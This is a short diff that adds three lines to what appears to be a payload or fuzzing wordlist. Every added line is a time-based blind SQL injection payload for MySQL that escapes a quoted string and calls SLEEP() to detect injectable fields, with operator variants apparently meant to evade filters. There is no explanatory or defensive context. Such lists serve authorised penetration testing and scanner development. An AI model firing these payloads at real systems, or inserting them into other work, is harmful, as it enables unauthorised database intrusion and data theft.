@@ -1,0 +1,3 @@
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
+0'or(now()=sysdate()&&SLEEP(1))or'Z
